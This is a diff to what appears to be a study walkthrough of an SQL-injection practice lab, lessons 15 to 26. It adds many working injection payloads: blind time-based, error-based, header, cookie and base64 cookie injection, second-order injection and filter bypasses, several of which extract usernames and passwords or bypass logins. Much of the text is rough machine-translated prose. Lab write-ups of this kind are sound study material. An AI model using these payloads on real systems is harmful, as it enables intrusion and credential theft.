@@ -158,7 +158,7 @@
   * select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.tables group by c)a;
   * And we use it on the username. Please remember to concat your query so that the query gets executed.
 
-## Lessons 15 & 16
+## Lessons 15
 ### Blind Boolean time-based with single and double quotes.
   * So now we move on to POST Parameter Blind-based Boolean injections which are like 1 or 1=1,
   * 1 AND 1=1, which means for the first query we have the Boolean value 1 and for the second we also have the Boolean value 1, which equals to TRUE, since an AND function is involved. In order to bypass the lab session 16 we use “) or (“1”)=”1 for bypassing the login. 
@@ -185,12 +185,213 @@
   * uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+&passwd=admin&submit=Submit
   * uname=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
   * uname=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
-  * Less-16 POST-Blind- Boolian/Time Based-Double quotes (based on bool type/time delay double quotes POST type blind)
+## Lesson 16 
+### POST-Blind- Boolian/Time Based-Double quotes
   * No matter how I enter this question in the login box, there is no error message displayed, and the guess is that the delayed blind.
   * Method one, time delay injection
   * The payload is similar to less-15, just change the single quotation marks from the previous question to double quotation marks and parentheses ") and you're done.
   * Method two: kinky tricks:
   * Universal account bypass password verification: admin")#
+  
+## Lesson 17 
+### POST-Update Query- Error Based-String
+  * checking the php file:
+  * Obviously, check_input is processed for uname here, check_input() function is as follows
+
+```
+function check_input($value)
+	{
+	if(!empty($value))
+		{
+		// truncation (see comments)
+		$value = substr($value,0,15);
+		}
+ 
+		// Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc())
+			{
+			$value = stripslashes($value);
+			}
+ 
+		// Quote if not a number
+		if (!ctype_digit($value))
+			{
+			$value = "'" . mysql_real_escape_string($value) . "'";
+			}
+		
+	else
+		{
+		$value = intval($value);
+		}
+	return $value;
+	}
+```
+  * Intercept only 15 characters get_magic_quotes_gpc()
+  * When magic_quotes_gpc=On, the function get_magic_quotes_gpc() will return 1
+  * When magic_quotes_gpc=Off, the function get_magic_quotes_gpc() will return 0
+  * The function of magic_quotes_gpc function in php is to judge the data parsed by the user. 
+  * For example, the data from post, get, cookie includes the escape character "\" to ensure that these data will not cause the program, especially the database statement because of the special Fatal errors due to pollution caused by characters.
+  * In the case of magic_quotes_gpc = On, if the input data has
+  * Characters such as single quotes (’), double quotes ("), backslashes (\), and NULL (NULL characters) will be backslashed.
+  * stripslashes() removes backslashes added by addslashes() function
+  * ctype_digit() judges whether it is a number, it returns true if it is a number, otherwise it returns false
+  * mysql_real_escape_string() escapes special characters in strings used in SQL statements.
+  * intval() integer conversion
+  * For password blasting:
+  * Use updatexml(), which is a brother to extractvaule(). The following test version() returns the mysql version:
+  * Explosion library payload (pic)
+  * Burst table name payload (pic)
+  * Burst listing payload (pic)
+uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and column_name not in ('user_id','user','first_name','last_name','avatar','last_login','failed_login')),0x7e),1) --+ &submit=Submit
+  * Burst value payload (pic)
+Use: uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &submit=Submit     [not found]
+  * Add a layer of select to try,
+uname=admin&passwd=admin' and  updatexml(1,concat(0x7e,(select password from (select password from users where username='admin'))),1) --+ &submit=Submit
+  * Check it and add a name, it's done. Final payload:
+uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users where username='admin') mingzi ),0x7e),1) --+&submit=Submit
+
+  * Can also be used:
+uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&submit=Submit
+
+## Lesson 18 
+### POST-Header Injection-Uagent field-Error based
+  * Seeing the echo of user-agent, I guess the injection point is in user-agnet, which can be tested directly, but let me go and see the php file:
+  * I’m relying on it. What did you say? The last question also said that passwrod didn’t do the check, so I did it.
+  * Seeing the insert statement again, he inserted the user-agent into the database, so he can start from here, and it can be seen that it is a single quote type, and then he started to explode.
+  * Capture the packet and modify the user-agent to the payload.
+  * Test burst library payload  'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
+  * No problem, you can blast steps are exactly the same as the previous error injection,
+  * Payload can be seen, less-12 double quotes error injection, only need to change the double quotes to single quotes can be used as the payload.
+  * Sample burst library payload:
+  * User-Agent:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
+
+## Lesson 19 
+### POST-Header Injection-Referer field-Error based
+  * This question is very similar to the previous question. The echo is referer. 
+  * Check the php file to find that the referer is inserted into the database in the insert statement, so the injection point is changed to referer. 
+  * The paylaod is exactly the same as the previous question.
+  * Sample burst library payload:
+  * Referer:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
+
+## Lesson 20 
+### POST-Cookie injections-Uagent field-Error based
+  * After login page:
+  * Check out the php file,
+  * You can see that the query statement queries cookee, then we will inject in cookies
+  * Take a look at the package:
+seecookie：uname=admin No problem is cookie injection
+  * Price list quotes found:
+A grammatical error broke out, which can be seen as a single quote.
+  * Add it to check the number of rows
+Cookie: uname=admin' order by 3--+ //1-3 normal
+Cookie: uname=admin' order by 4--+ //4 is abnormal, make sure the number of rows is 3
+
+  * Explosion library payload
+Cookie: uname=-admin' union select 1,2,database()--+
+  * The following is a repetitive step. You only need to modify the payload in the third query position to complete the SQL injection. 
+
+## Lesson 21
+### Cookie Injection- Error Based- complex-string
+  * Base64 encoding, single quotes, error type, cookie type injection.
+  * This level is similar to less-20, except that the cookie's uname value is base64 encoded.
+  * After login page: The circled area is obviously encrypted with base64, and decoded: admin is the uname just logged in, 
+  * so guess: this question encrypted the string at the cookie,
+  * This is indeed the case when viewing php files, so you only need to encrypt base64 when uploading paylaod.
+  * Seeing that the cookie is YWRtaW4%3D, which is not the same as the page display, but obviously %3D is the result of the = number urldecode.
+  * Payload : admin' and 1=1 --+ //plain text
+  * YWRtaW4nIGFuZCAxPTEgLS0r //Ciphertext
+  * After many tests, --+ is not easy to use here, you need to use # to comment.
+  * Example burst library paylaod: -admin') union select 1,2,database()#
+  * LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==
+  * Only need to modify the third query statement, which is the same as less-20 (note the # comment, not --+), as long as base64 is encrypted and written into the cookie.
+
+## Lesson 22
+### Cookie Injection - Error Based- Double Quotes-string
+  * Same as less-21, just use double quotes instead of single quotesRemove the brackets.
+  * Sample payload  -admin" union select 1,2,database()#
+  * LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj
+
+## Lesson 23
+### GET-Error based-strip comments
+  * Seeing that the available comment characters have been replaced, so we construct a closed statement:
+  * Explosion library payload
+  * ?id=' union select 1,2,database() '
+  * ?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
+  * ?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
+  * ?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '
+
+## Lesson 24
+### Second Degree Injections -Store Injections
+  * Secondary injection
+
+Our steps are
+
+1. Register an admin'# account.
+2. Log in to admin'#, and modify the password of the account. At this time, the password of the admin is changed, and I changed it to 123456.
+
+Sql statement becomes UPDATE users SET passwd="New_Pass" WHERE username ='admin' # 'AND password='
+
+That is, the UPDATE users SET passwd="New_Pass" WHERE username ='admin'
+If successful, the page will promptPassword successfully updated
+
+3. Use the password I just changed to 123456. Log in to the admin account and you can log in successfully.
+
+## Lesson 25
+### Trick with OR & AND (filtered or and and)
+  * OR & AND deception
+
+have a test
+Seeing single quotes around id,
+
+However, the second payload has no errors and can be injected.
+
+Method one, --+ bypass, general injection.
+
+Sample payload
+
+?id=-1' union select 1,2,database()--+
+It is necessary to say that this question processed the password when the value was burst, query the password column, and echo no column passwd, so double-write or bypass
+
+The same goes for information.
+
+Sample payload
+?id=-1' union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+
+
+Method two, double write or or and bypass
+
+Test payload
+?id=0' oorr 1=1 --+
+?id=2' aandnd 1=1 --+
+or and form a closed statement, sql query.
+  * Less-25a Trick with OR & AND Blind (filtered or and and blind)
+
+So how to judge that the and and or are filtered by the blind bet, add or or directly in front
+Different from the 25 level is that there is no'' inclusion for id in the SQL statement, and there is no error item output, and error injection cannot be used. The rest is basically the same as the 25 example.
+Two methods are adopted here: delayed injection and joint injection.
+?id=-1%20||%20if(length(database())=8,1,sleep(5))#
+?id=-1%20union%20select%201,database(),3#
+
+## Lesson 26
+### Trick with comments and space (filtered comments and space injection)
+
+Comment deception
+
+Test for half a day, no progress, check the php file
+You can see that the function blacklist($id) comes to filter the whole family bucket, and the single quotes around $id, or, and, /*, –, #, space, /
+
+*********************************************************************************************************************************
+
+At this point, there is a problem. From this question to 28a, the injection fails. It is estimated that this is the case. The uncomfortable thing is that my linux virtual machine has a problem. It has not been done yet.
+
+Note: Some friends at this level may not be able to use some special characters to replace spaces under windows. This is because of the apache parsing problem. Please change toLinuxUnder the platform.
+
+ 
+
+*************************************************************************************************************************************
+?id='%a0uNion%a0sElect(1),(database()),(3) or (1)='1 burst database
+ ?id='%a0uNion%a0sElect(1), (group_concat(table_name)), (3)%a0from%a0information_schema.tables%a0where%a0table_schema='security'%26%26%a0%271%27=%271 Table
+ ?id='%a0uNion%a0sElect(1), group_concat(column_name), 3%a0from%a0information_schema.columns%a0where%a0table_schema='security'%a0%26%26%a0table_name='emails'%26%26%a0 %271%27=%271 burst
+ ?id='%a0uNion%a0sElect(1), group_concat(email_id), 3%a0from%a0emails%a0uniOn%a0seLect (1), 2,'3 Extract data
 
 
 
